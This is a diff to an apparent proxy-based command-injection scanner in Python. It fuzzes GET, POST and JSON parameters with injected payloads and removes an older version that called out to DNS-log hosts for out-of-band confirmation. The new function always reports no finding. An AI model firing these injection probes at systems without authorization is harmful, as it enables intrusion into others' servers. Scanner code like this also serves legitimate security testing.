@@ -5,7 +5,10 @@ import requests
 import time
 import copy
 import urlparse
+import copy
+import base64
 from config import *
+from lib.common import *
 
 
 
@@ -17,8 +20,8 @@ def verify(task):
     :param: task, the proxy request item
     :rtype: a tuple, if exists, return(True, message), else return(False, {})
     """
-    if task["method"] != "GET":
-        return (False, {})
+    # if task["method"] != "GET":
+    #     return (False, {})
     message = {
         "method": "",
         "url" : "",
@@ -28,76 +31,108 @@ def verify(task):
     }
 
     # dns loc
-    dnsloc = "{}.devil.yoyostay.top"
+    url = task['url']
+    method =  task['method']
+    headers = task['headers']
+    target  = base64.b64encode(url).replace('=', '')
+    data = task['request_content'] if method == 'POST' else None
+    hj = THTTPJOB(url, method=method, headers=headers, data=data)
+    # item_list = []
+    # base_url = task['url']
 
-    item_list = []
-    base_url = task['url']
-
-    url_parse = urlparse.urlparse(base_url)
-    if url_parse.query == "":
+    url_parse = urlparse.urlparse(url)
+    if url_parse.query == "" and method=='GET':
         return (False, {})
+
+    payload_list = copy.copy(command_injection_payloads)
+    payload_list = [p.replace('{domain}', target) for p in payload_list]
+
+    # get query:
+    isjson = False
+    found = False
+    if method == 'GET':
+        query = hj.url.get_query
+    else:
+        if is_json_data(hj.data):
+            query = urllib.urlencode(json.loads(hj.data))
+            isjson = True
+        else:
+            query = hj.data
+    
+    # generate pollution
+    payload_dict = Pollution(query, payload_list).payload_generate()
+    for payload in payload_dict:
+        if method == 'GET':
+            hj.url.get_dict_query = payload
+        else:
+            if isjson:
+                hj.data = json.dumps(payload)
+            else:
+                hj.data = urllib.urlencode(payload)
+        
+        hj.request()
+    
+    return (False, {})
+
+
+
+
 
     # get target pre
-    tag = url_parse.netloc.replace(".", "-")  + url_parse.path.replace("/", "-")
-    dnsloc = dnsloc.format(tag)
+    
 
-    fuzz_payload = []
-    for p in command_injection_payloads:
-        fuzz_payload.append(p.format(dnsloc))
+    # query = dict(urlparse.parse_qsl(url_parse.query))
+    # # first makeup payload, and this is add,
+    # for keys in query.keys():
+    #     try:
+    #         for payload_item in fuzz_payload:
+    #             #toreplace_payload = payload_item.encode("utf-8")
 
+    #             payload_item = query[keys] + payload_item
+    #             # makeup the all paramters
+    #             params = ""
+    #             for in_key in query.keys():
+    #                 if in_key == keys:
+    #                     params += in_key + "=" + payload_item
+    #                 else:
+    #                     params += in_key + "=" + query[in_key]
+    #                 params += "&"
+    #             params = params[:-1]
 
-    query = dict(urlparse.parse_qsl(url_parse.query))
-    # first makeup payload, and this is add,
-    for keys in query.keys():
-        try:
-            for payload_item in fuzz_payload:
-                #toreplace_payload = payload_item.encode("utf-8")
+    #             attack_url = url_parse.scheme + "://" + url_parse.netloc + url_parse.path + "?" + params
+    #             _ = copy.deepcopy(task)
+    #             _["url"] = attack_url
 
-                payload_item = query[keys] + payload_item
-                # makeup the all paramters
-                params = ""
-                for in_key in query.keys():
-                    if in_key == keys:
-                        params += in_key + "=" + payload_item
-                    else:
-                        params += in_key + "=" + query[in_key]
-                    params += "&"
-                params = params[:-1]
+    #             item_list.append(_)
+    #     except Exception as e:
+    #         logger.error(repr(e))
 
-                attack_url = url_parse.scheme + "://" + url_parse.netloc + url_parse.path + "?" + params
-                _ = copy.deepcopy(task)
-                _["url"] = attack_url
+    # for item in item_list:
+    #     try:
+    #         requests.get(item["url"], headers=item["request_header"], verify=False, allow_redirects=True, timeout=10)
+    #     except Exception as e:
+    #         logger.error(repr(e))
 
-                item_list.append(_)
-        except Exception as e:
-            logger.error(repr(e))
+    # # replace the headers
+    # for payload in fuzz_payload:
+    #     task["request_header"]["User-Agent"] = payload
+    #     try:
+    #         requests.get(task["url"], headers=task["request_header"], timeout=10)
+    #     except Exception as e:
+    #         logger.error(repr(e))
 
-    for item in item_list:
-        try:
-            requests.get(item["url"], headers=item["request_header"], verify=False, allow_redirects=True, timeout=10)
-        except Exception as e:
-            logger.error(repr(e))
-
-    # replace the headers
-    for payload in fuzz_payload:
-        task["request_header"]["User-Agent"] = payload
-        try:
-            requests.get(task["url"], headers=task["request_header"], timeout=10)
-        except Exception as e:
-            logger.error(repr(e))
-
-    # verify the log
-    time.sleep(5)
-    dnsApi = "http://dnslog.niufuren.cc/api/dns/devil/{}/"
-    rep = requests.get(dnsApi.format(tag))
-    if "True" in rep.text:
-        message["url"] = task["url"]
-        message["param"] = tag
-        message["method"] = task["method"]
-        save_to_databases(message)
-        return (True, message)
-    else:
-        return (False, {})
+    # # verify the log
+    # time.sleep(5)
+    # dnsApi = "http://dnslog.niufuren.cc/api/dns/devil/{}/"
+    # rep = requests.get(dnsApi.format(tag))
+    # if "True" in rep.text:
+    #     message["url"] = task["url"]
+    #     message["param"] = tag
+    #     message["method"] = task["method"]
+    #     save_to_databases(message)
+    #     return (True, message)
+    # else:
+    #     return (False, {})
 
 
 
